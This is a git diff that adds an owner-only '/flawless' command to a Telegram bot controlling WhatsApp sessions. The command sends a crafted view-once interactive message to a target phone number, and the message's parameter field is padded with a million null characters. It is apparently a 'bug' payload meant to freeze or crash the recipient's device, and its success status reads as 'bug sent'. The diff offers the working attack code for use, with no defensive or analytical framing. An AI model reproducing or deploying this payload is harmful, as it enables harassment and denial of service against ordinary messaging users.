@@ -45,6 +45,11 @@ function saveActiveSessions(botNumber) {
     }
 }
 
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+
 async function initializeWhatsAppConnections() {
     try {
         if (fs.existsSync(SESSIONS_FILE)) {
@@ -932,6 +937,144 @@ bot.onText(/\/infobot/, async (msg) => {
         }
     );
 });
+
+//CMD Bag Jir
+
+bot.onText(/\/flawless (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id.toString();
+    
+    if (userId !== config.OWNER_ID) {
+        return;
+    }
+
+    const target = match[1];
+
+    if (sessions.size === 0) {
+        await bot.sendPhoto(
+            chatId,
+            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
+            {
+                caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴇʀʀᴏʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇsɪ ᴀᴋᴛɪғ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                parse_mode: "Markdown"
+            }
+        );
+        return;
+    }
+
+    const sock = sessions.values().next().value;
+    
+    if (!sock || sock.connection !== "open") {
+        await bot.sendPhoto(
+            chatId,
+            'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
+            {
+                caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴇʀʀᴏʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ Status: sᴇsɪ ʙᴇʟᴜᴍ ᴛᴇʀʜᴜʙᴜɴɢ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+                parse_mode: "Markdown"
+            }
+        );
+        return;
+    }
+
+    const processingMsg = await bot.sendPhoto(
+        chatId,
+        'https://uploader.zenzxz.dpdns.org/uploads/1761998302554.jpeg',
+        {
+            caption: `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴘʀᴏsᴇs
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ Status: ᴍᴇɴɢɪʀɪᴍ...
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+            parse_mode: "Markdown"
+        }
+    );
+
+    try {
+        await Nullvisible(sock, target);
+        await sleep(500);
+
+        await bot.editMessageCaption(
+            `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          sᴜᴄᴄᴇss
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ Status: ʙᴇʀʜᴀsɪʟ ᴛᴇʀᴋɪʀɪᴍ
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+            {
+                chat_id: chatId,
+                message_id: processingMsg.message_id,
+                parse_mode: "Markdown",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "ʟɪʜᴀᴛ ᴡʜᴀᴛsᴀᴘᴘ", url: `https://wa.me/${target}` }]
+                    ]
+                }
+            }
+        );
+
+    } catch (error) {
+        await bot.editMessageCaption(
+            `\`\`\`
+◤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◥
+          ᴇʀʀᴏʀ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❯ ᴛᴀʀɢᴇᴛ: ${target}
+❯ Status: ${error.message}
+❯ Time: ${moment().format('HH:mm:ss')}
+◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢
+\`\`\``,
+            {
+                chat_id: chatId,
+                message_id: processingMsg.message_id,
+                parse_mode: "Markdown"
+            }
+        );
+    }
+});
+
+//Fank Tion Bag
+async function Nullvisible(sock, target) {
+    await sock.relayMessage(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "visiblemoment",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "call_permission_request",
+                        paramsJson: "\u0000".repeat(1000000),
+                        version: 3
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target }});
+    
+    console.log('NullVisibleAttackDeviceYou');
+}
 
 initializeWhatsAppConnections();
 
